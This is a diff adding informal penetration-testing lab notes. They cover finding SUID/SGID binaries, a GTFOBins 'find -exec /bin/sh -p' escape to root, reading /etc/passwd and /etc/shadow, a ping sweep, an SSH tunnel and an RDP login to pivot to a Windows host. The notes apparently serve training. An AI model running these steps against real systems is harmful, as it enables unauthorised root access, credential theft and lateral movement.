@@ -387,4 +387,49 @@ syntax to querie this:
 
 
 
-  
+**find / -type f -perm /4000 -ls 2>/dev/null : (find SUID only files)**
+
+**find / -type f -perm /2000 -ls 2>/dev/null : (find SGID only files)**
+
+**find / -type f -perm /6000 -ls 2>/dev/nulll : (find SUID and SGID files)**
+
+
+- (once you have cmds that you can run, open browser, put in gtfobins : allows you to query on binaries or files to see if there is anything vulnerable) 
+
+Search on sudo -l commands
+
+- (if thre are none, start with top/bottom 3 SUID/SGID commands)
+
+- (once you find a cmd that has SUID/SGID bit set go back to GTFObins and find the command listed under the respective tabs)
+
+- (for this /usr/bin/find was the SUID priv esc cmd)
+
+(from browser gtfobins gives you a cmd)
+
+**find . -exec /bin/sh -p \; -quit**
+
+- (enter into box and youll be given root privs)
+
+(you can cat for /etc/passwd /etc/shadow)
+
+- (run a ping on the box)
+
+  **for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) 2>/dev/null ;done**
+
+- (will prompt you new ip to enumerate, run proxychains and enumerate ports)
+
+(for this you were given an ip that is a windows with port 3389 on it)
+
+- (3389 = RDP, and youll connect to it via rdp, use the creds your given which used all of them besides 1 which was Aaron)
+
+- from Op station specify local listening port on RHP (Random High Port)
+
+**ssh -p user@(ip) -L RHP:(IP):3389**
+
+- from Op station point xfreerdp to new local listening tunnel
+
+**xfreerdp /u:Aaron /v:localhost:RHP /dynamic-resolution +clipboard**
+
+- (then your into an rdp session on a windows box)
+
+(note: you just look around, and on the box under setup there was an inital_setup file with all info)
